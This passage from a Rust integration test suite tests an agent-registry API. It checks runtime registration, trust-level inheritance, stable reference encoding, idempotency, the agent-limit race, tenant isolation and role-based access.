    let trust_level: String = principal_row.try_get("trust_level").expect("trust_level");
    let lifecycle_state: String = principal_row
        .try_get("lifecycle_state")
        .expect("lifecycle_state");

    assert_eq!(principal_type, "runtime_agent");
    assert_eq!(display_name, "claude-code-main");
    assert_eq!(trust_level, "high"); // inherits endpoint trust_level
    assert_eq!(lifecycle_state, "active");

    // Verify the principal_membership linking runtime → endpoint exists.
    let membership_row = sqlx::query::query(
        r#"SELECT target_kind, target_id
           FROM principal_memberships
           WHERE tenant_id = $1 AND principal_id = $2"#,
    )
    .bind(harness.tenant_id)
    .bind(runtime_principal_id)
    .fetch_one(&harness.db)
    .await
    .expect("fetch runtime membership");

    let target_kind: String = membership_row.try_get("target_kind").expect("target_kind");
    let target_id: Uuid = membership_row.try_get("target_id").expect("target_id");
    assert_eq!(target_kind, "endpoint");
    assert_eq!(target_id, endpoint_principal_id);

    let hierarchy_row = sqlx::query::query(
        r#"SELECT parent_id, node_type, external_id, name
           FROM hierarchy_nodes
           WHERE tenant_id = $1 AND id = $2"#,
    )
    .bind(harness.tenant_id)
    .bind(hierarchy_node_id)
    .fetch_one(&harness.db)
    .await
    .expect("fetch runtime hierarchy node");
    let parent_id: Option<Uuid> = hierarchy_row.try_get("parent_id").expect("parent_id");
    let node_type: String = hierarchy_row.try_get("node_type").expect("node_type");
    let external_id: Option<String> = hierarchy_row.try_get("external_id").expect("external_id");
    let name: String = hierarchy_row.try_get("name").expect("name");

    assert_eq!(parent_id, Some(endpoint_node_id));
    assert_eq!(node_type, "runtime");
    assert_eq!(external_id.as_deref(), Some("claude-code-main"));
    assert_eq!(name, "claude-code-main");
    assert_eq!(
        stable_ref,
        format!(
            "runtime:endpoint:{}:name:{}",
            hex::encode("rt-ep-1".as_bytes()),
            hex::encode("claude-code-main".as_bytes()),
        ),
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn register_runtime_sanitizes_legacy_endpoint_trust_levels_when_request_omits_override() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let agent_uuid = register_endpoint_agent(
        &harness.app,
        &harness.api_key,
        "rt-legacy-trust",
        "Legacy Trust Endpoint",
    )
    .await;

    sqlx::query::query(
        r#"UPDATE agents
           SET trust_level = 'verified'
           WHERE tenant_id = $1
             AND id = $2"#,
    )
    .bind(harness.tenant_id)
    .bind(agent_uuid)
    .execute(&harness.db)
    .await
    .expect("downgrade endpoint trust level to legacy value");

    let keypair = hush_core::Keypair::generate();
    let resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/agents/{agent_uuid}/runtimes"),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "name": "legacy-runtime",
            "public_key": keypair.public_key().to_hex()
        })),
    )
    .await;
    assert_eq!(resp.0, StatusCode::OK);

    let runtime_principal_id = Uuid::parse_str(
        resp.1["runtime_principal_id"]
            .as_str()
            .expect("runtime_principal_id missing"),
    )
    .expect("parse runtime principal id");

    let principal_row = sqlx::query::query(
        r#"SELECT trust_level
           FROM principals
           WHERE tenant_id = $1
             AND id = $2"#,
    )
    .bind(harness.tenant_id)
    .bind(runtime_principal_id)
    .fetch_one(&harness.db)
    .await
    .expect("fetch runtime principal");
    let trust_level: String = principal_row.try_get("trust_level").expect("trust_level");
    assert_eq!(trust_level, "medium");
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn register_runtime_uses_collision_safe_stable_refs() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let endpoint_agent_id_a = "alpha/runtime/bravo";
    let endpoint_agent_id_b = "alpha";
    let runtime_name_a = "charlie";
    let runtime_name_b = "bravo/runtime/charlie";

    let legacy_stable_ref_a = format!("{endpoint_agent_id_a}/runtime/{runtime_name_a}");
    let legacy_stable_ref_b = format!("{endpoint_agent_id_b}/runtime/{runtime_name_b}");
    assert_eq!(legacy_stable_ref_a, legacy_stable_ref_b);

    let agent_a = register_endpoint_agent(
        &harness.app,
        &harness.api_key,
        endpoint_agent_id_a,
        "Collision Endpoint A",
    )
    .await;
    let agent_b = register_endpoint_agent(
        &harness.app,
        &harness.api_key,
        endpoint_agent_id_b,
        "Collision Endpoint B",
    )
    .await;

    let runtime_a = register_runtime(&harness.app, &harness.api_key, agent_a, runtime_name_a).await;
    assert_eq!(runtime_a.0, StatusCode::OK);
    let runtime_b = register_runtime(&harness.app, &harness.api_key, agent_b, runtime_name_b).await;
    assert_eq!(runtime_b.0, StatusCode::OK);

    let runtime_a_principal_id = Uuid::parse_str(
        runtime_a.1["runtime_principal_id"]
            .as_str()
            .expect("runtime_a principal id"),
    )
    .expect("parse runtime_a principal id");
    let runtime_b_principal_id = Uuid::parse_str(
        runtime_b.1["runtime_principal_id"]
            .as_str()
            .expect("runtime_b principal id"),
    )
    .expect("parse runtime_b principal id");
    assert_ne!(runtime_a_principal_id, runtime_b_principal_id);

    let runtime_a_row = sqlx::query::query(
        r#"SELECT stable_ref
           FROM principals
           WHERE tenant_id = $1
             AND id = $2"#,
    )
    .bind(harness.tenant_id)
    .bind(runtime_a_principal_id)
    .fetch_one(&harness.db)
    .await
    .expect("fetch runtime_a principal");
    let runtime_b_row = sqlx::query::query(
        r#"SELECT stable_ref
           FROM principals
           WHERE tenant_id = $1
             AND id = $2"#,
    )
    .bind(harness.tenant_id)
    .bind(runtime_b_principal_id)
    .fetch_one(&harness.db)
    .await
    .expect("fetch runtime_b principal");

    let runtime_a_stable_ref: String = runtime_a_row.try_get("stable_ref").expect("stable_ref");
    let runtime_b_stable_ref: String = runtime_b_row.try_get("stable_ref").expect("stable_ref");
    assert_ne!(runtime_a_stable_ref, runtime_b_stable_ref);
    assert_eq!(
        runtime_a_stable_ref,
        format!(
            "runtime:endpoint:{}:name:{}",
            hex::encode(endpoint_agent_id_a.as_bytes()),
            hex::encode(runtime_name_a.as_bytes()),
        ),
    );
    assert_eq!(
        runtime_b_stable_ref,
        format!(
            "runtime:endpoint:{}:name:{}",
            hex::encode(endpoint_agent_id_b.as_bytes()),
            hex::encode(runtime_name_b.as_bytes()),
        ),
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn register_runtime_rejects_nonexistent_endpoint() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;

    let fake_uuid = Uuid::new_v4();
    let (status, _body) =
        register_runtime(&harness.app, &harness.api_key, fake_uuid, "orphan-runtime").await;
    assert_eq!(status, StatusCode::NOT_FOUND);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn register_runtime_is_idempotent() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let agent_uuid = register_endpoint_agent(
        &harness.app,
        &harness.api_key,
        "rt-ep-idem",
        "Idem Endpoint",
    )
    .await;

    let keypair = hush_core::Keypair::generate();
    let payload = serde_json::json!({
        "name": "idempotent-runtime",
        "public_key": keypair.public_key().to_hex()
    });

    let resp1 = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/agents/{agent_uuid}/runtimes"),
        Some(&harness.api_key),
        Some(payload.clone()),
    )
    .await;
    assert_eq!(resp1.0, StatusCode::OK);

    let resp2 = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/agents/{agent_uuid}/runtimes"),
        Some(&harness.api_key),
        Some(payload.clone()),
    )
    .await;
    assert_eq!(resp2.0, StatusCode::OK);

    // Both calls should return the same runtime principal id.
    assert_eq!(
        resp1.1["runtime_principal_id"], resp2.1["runtime_principal_id"],
        "idempotent registration should return the same runtime_principal_id"
    );

    // Verify only one principal_memberships row exists.
    let membership_count: i64 = sqlx::query::query(
        r#"SELECT COUNT(*)::bigint AS cnt
           FROM principal_memberships
           WHERE tenant_id = $1
             AND principal_id = $2
             AND target_kind = 'endpoint'"#,
    )
    .bind(harness.tenant_id)
    .bind(
        Uuid::parse_str(resp1.1["runtime_principal_id"].as_str().expect("pid")).expect("parse pid"),
    )
    .fetch_one(&harness.db)
    .await
    .expect("count memberships")
    .try_get("cnt")
    .expect("cnt");
    assert_eq!(membership_count, 1);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn delete_agent_only_removes_runtime_nodes_for_matching_endpoint_link() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let agent_a = register_endpoint_agent(
        &harness.app,
        &harness.api_key,
        "dup-endpoint-a",
        "Shared Endpoint",
    )
    .await;
    let agent_b = register_endpoint_agent(
        &harness.app,
        &harness.api_key,
        "dup-endpoint-b",
        "Shared Endpoint",
    )
    .await;

    let endpoint_node_a = Uuid::new_v4();
    let endpoint_node_b = Uuid::new_v4();
    insert_endpoint_hierarchy_node(
        &harness.db,
        harness.tenant_id,
        endpoint_node_a,
        "Shared Endpoint",
        Some("dup-endpoint-a"),
    )
    .await;
    insert_endpoint_hierarchy_node(
        &harness.db,
        harness.tenant_id,
        endpoint_node_b,
        "Shared Endpoint",
        Some("dup-endpoint-b"),
    )
    .await;

    let runtime_a = register_runtime(&harness.app, &harness.api_key, agent_a, "runtime-a").await;
    assert_eq!(runtime_a.0, StatusCode::OK);
    let runtime_a_node_id = Uuid::parse_str(
        runtime_a.1["hierarchy_node_id"]
            .as_str()
            .expect("runtime_a hierarchy node id"),
    )
    .expect("parse runtime_a hierarchy node id");

    let runtime_b = register_runtime(&harness.app, &harness.api_key, agent_b, "runtime-b").await;
    assert_eq!(runtime_b.0, StatusCode::OK);
    let runtime_b_node_id = Uuid::parse_str(
        runtime_b.1["hierarchy_node_id"]
            .as_str()
            .expect("runtime_b hierarchy node id"),
    )
    .expect("parse runtime_b hierarchy node id");

    let delete_resp = request_json(
        &harness.app,
        Method::DELETE,
        format!("/api/v1/agents/{agent_a}"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(delete_resp.0, StatusCode::OK);

    let deleted_runtime = sqlx::query::query(
        r#"SELECT 1
           FROM hierarchy_nodes
           WHERE tenant_id = $1
             AND id = $2"#,
    )
    .bind(harness.tenant_id)
    .bind(runtime_a_node_id)
    .fetch_optional(&harness.db)
    .await
    .expect("query deleted runtime node");
    assert!(deleted_runtime.is_none());

    let surviving_runtime = sqlx::query::query(
        r#"SELECT parent_id, external_id
           FROM hierarchy_nodes
           WHERE tenant_id = $1
             AND id = $2"#,
    )
    .bind(harness.tenant_id)
    .bind(runtime_b_node_id)
    .fetch_one(&harness.db)
    .await
    .expect("query surviving runtime node");
    let parent_id: Option<Uuid> = surviving_runtime.try_get("parent_id").expect("parent_id");
    let external_id: Option<String> = surviving_runtime
        .try_get("external_id")
        .expect("external_id");
    assert_eq!(parent_id, Some(endpoint_node_b));
    assert_eq!(external_id.as_deref(), Some("runtime-b"));
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn register_agent_serializes_concurrent_agent_limit_checks() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    sqlx::query::query("UPDATE tenants SET agent_limit = 1 WHERE id = $1")
        .bind(harness.tenant_id)
        .execute(&harness.db)
        .await
        .expect("set tenant agent limit");

    sqlx::raw_sql::raw_sql(
        r#"
        CREATE OR REPLACE FUNCTION sleep_before_agent_insert() RETURNS trigger AS $$
        BEGIN
            PERFORM pg_sleep(0.25);
            RETURN NEW;
        END;
        $$ LANGUAGE plpgsql;

        CREATE TRIGGER sleep_before_agent_insert
        BEFORE INSERT ON agents
        FOR EACH ROW
        EXECUTE FUNCTION sleep_before_agent_insert();
        "#,
    )
    .execute(&harness.db)
    .await
    .expect("install agent insert delay trigger");

    let app = &harness.app;
    let api_key = harness.api_key.as_str();
    let agent_a_public_key = hush_core::Keypair::generate().public_key().to_hex();
    let agent_b_public_key = hush_core::Keypair::generate().public_key().to_hex();

    let req_a = request_json(
        app,
        Method::POST,
        "/api/v1/agents".to_string(),
        Some(api_key),
        Some(serde_json::json!({
            "agent_id": "agent-limit-race-a",
            "name": "Limit Race A",
            "public_key": agent_a_public_key,
            "role": "coder",
            "trust_level": "high"
        })),
    );
    let req_b = request_json(
        app,
        Method::POST,
        "/api/v1/agents".to_string(),
        Some(api_key),
        Some(serde_json::json!({
            "agent_id": "agent-limit-race-b",
            "name": "Limit Race B",
            "public_key": agent_b_public_key,
            "role": "coder",
            "trust_level": "high"
        })),
    );

    let (resp_a, resp_b) = tokio::join!(req_a, req_b);
    let ok_count = [resp_a.0, resp_b.0]
        .into_iter()
        .filter(|status| *status == StatusCode::OK)
        .count();
    let conflict_count = [resp_a.0, resp_b.0]
        .into_iter()
        .filter(|status| *status == StatusCode::CONFLICT)
        .count();
    assert_eq!(ok_count, 1, "exactly one registration should succeed");
    assert_eq!(
        conflict_count, 1,
        "the competing registration should be rejected"
    );

    let conflict_body = [resp_a.1, resp_b.1]
        .into_iter()
        .zip([resp_a.0, resp_b.0])
        .find_map(|(body, status)| (status == StatusCode::CONFLICT).then_some(body))
        .expect("conflict response body");
    assert_eq!(conflict_body["error"], "agent limit reached");

    let active_agent_count: i64 = sqlx::query::query(
        r#"SELECT COUNT(*)::bigint AS cnt
           FROM agents
           WHERE tenant_id = $1
             AND status = 'active'"#,
    )
    .bind(harness.tenant_id)
    .fetch_one(&harness.db)
    .await
    .expect("count active agents")
    .try_get("cnt")
    .expect("cnt");
    assert_eq!(active_agent_count, 1);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn register_agent_accepts_system_trust_level_and_rejects_standard() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;

    let system_keypair = hush_core::Keypair::generate();
    let system_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/agents".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "agent_id": "agent-trust-system",
            "name": "System Agent",
            "public_key": system_keypair.public_key().to_hex(),
            "role": "coder",
            "trust_level": "system"
        })),
    )
    .await;
    assert_eq!(system_resp.0, StatusCode::OK);

    let trust_row = sqlx::query::query(
        r#"SELECT trust_level
           FROM agents
           WHERE tenant_id = $1
             AND agent_id = 'agent-trust-system'"#,
    )
    .bind(harness.tenant_id)
    .fetch_one(&harness.db)
    .await
    .expect("fetch system-trust agent");
    let trust_level: String = trust_row.try_get("trust_level").expect("trust_level");
    assert_eq!(trust_level, "system");

    let standard_keypair = hush_core::Keypair::generate();
    let standard_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/agents".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "agent_id": "agent-trust-standard",
            "name": "Standard Agent",
            "public_key": standard_keypair.public_key().to_hex(),
            "role": "coder",
            "trust_level": "standard"
        })),
    )
    .await;
    assert_eq!(standard_resp.0, StatusCode::BAD_REQUEST);
    assert!(
        standard_resp.1["error"]
            .as_str()
            .expect("standard-trust error")
            .contains("trust_level"),
        "unexpected error response: {}",
        standard_resp.1
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn list_runtimes_returns_registered_runtimes() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let agent_uuid = register_endpoint_agent(
        &harness.app,
        &harness.api_key,
        "rt-ep-list",
        "List Endpoint",
    )
    .await;

    // Register three runtimes.
    let names = ["runtime-alpha", "runtime-beta", "runtime-gamma"];
    for name in &names {
        let (status, _) = register_runtime(&harness.app, &harness.api_key, agent_uuid, name).await;
        assert_eq!(status, StatusCode::OK, "register runtime {name} failed");
    }

    // List runtimes.
    let list_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/agents/{agent_uuid}/runtimes"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(list_resp.0, StatusCode::OK);

    let runtimes = list_resp.1.as_array().expect("runtimes array");
    assert_eq!(runtimes.len(), 3);

    let returned_names: Vec<&str> = runtimes
        .iter()
        .map(|r| r["display_name"].as_str().expect("display_name"))
        .collect();
    for name in &names {
        assert!(
            returned_names.contains(name),
            "expected runtime {name} in list, got {returned_names:?}"
        );
    }

    // Verify each entry has the expected fields populated.
    for runtime in runtimes {
        assert!(runtime["principal_id"].is_string());
        assert!(runtime["stable_ref"].is_string());
        assert_eq!(runtime["trust_level"], "high");
        assert_eq!(runtime["lifecycle_state"], "active");
    }
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn list_runtimes_enforces_tenant_isolation() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;

    // Register an endpoint and runtimes under tenant A (the harness tenant).
    let agent_uuid = register_endpoint_agent(
        &harness.app,
        &harness.api_key,
        "rt-ep-iso",
        "Isolation Endpoint",
    )
    .await;
    let (status, _) =
        register_runtime(&harness.app, &harness.api_key, agent_uuid, "iso-runtime-1").await;
    assert_eq!(status, StatusCode::OK);

    // Tenant A can list its runtimes.
    let list_a = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/agents/{agent_uuid}/runtimes"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(list_a.0, StatusCode::OK);
    assert_eq!(
        list_a.1.as_array().expect("runtimes array").len(),
        1,
        "tenant A should see its runtime"
    );

    // Create tenant B with its own API key.
    let tenant_b_id = seed_tenant(&harness.db, "globex-iso", "Globex Isolation").await;
    let tenant_b_key = "cs_it_tenant_b_key";
    insert_api_key_for_tenant(
        &harness.db,
        tenant_b_id,
        tenant_b_key,
        "tenant-b-admin",
        &["admin"],
    )
    .await;

    // Tenant B trying to access tenant A's agent should get 404 (agent not found
    // for that tenant).
    let list_b = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/agents/{agent_uuid}/runtimes"),
        Some(tenant_b_key),
        None,
    )
    .await;
    assert_eq!(
        list_b.0,
        StatusCode::NOT_FOUND,
        "tenant B must not see tenant A's agent runtimes"
    );

    // Tenant B trying to register a runtime under tenant A's agent should also
    // fail with 404.
    let (reg_status, _) = register_runtime(
        &harness.app,
        tenant_b_key,
        agent_uuid,
        "cross-tenant-runtime",
    )
    .await;
    assert_eq!(
        reg_status,
        StatusCode::NOT_FOUND,
        "tenant B must not register runtimes under tenant A's agent"
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn register_runtime_rejects_viewer_role() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;

    // Register an endpoint agent using the admin key.
    let agent_uuid = register_endpoint_agent(
        &harness.app,
        &harness.api_key,
        "rt-ep-viewer",
        "Viewer Endpoint",
    )
    .await;

    // Create a viewer API key (no admin/write scopes → role = "viewer").
    let viewer_key = "cs_it_runtime_viewer_key";
    insert_api_key_for_tenant(
        &harness.db,
        harness.tenant_id,
        viewer_key,
        "runtime-viewer",
        &["viewer"],
    )
    .await;

    // Viewer should be forbidden from registering runtimes.
    let (status, _) =
        register_runtime(&harness.app, viewer_key, agent_uuid, "viewer-runtime").await;
    assert_eq!(
        status,
        StatusCode::FORBIDDEN,
        "viewer role must not be able to register runtimes"
    );

    // Viewer should still be able to list runtimes (read-only).
    let list_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/agents/{agent_uuid}/runtimes"),
        Some(viewer_key),
        None,
    )
    .await;
    assert_eq!(
        list_resp.0,
        StatusCode::OK,
        "viewer role should be able to list runtimes"
    );
}

#[test]
fn parse_docker_host_port_extracts_ipv4_and_ipv6_bindings() {
    assert_eq!(parse_docker_host_port("127.0.0.1:49153\n"), Some(49153));
    assert_eq!(parse_docker_host_port("::1:49154\n"), Some(49154));
    assert_eq!(
        parse_docker_host_port("0.0.0.0:49155\n:::49155\n"),
        Some(49155)
    );
}

#[test]
fn parse_docker_host_port_returns_none_for_unpublished_output() {
    assert_eq!(parse_docker_host_port(""), None);
    assert_eq!(parse_docker_host_port("not published"), None);
}
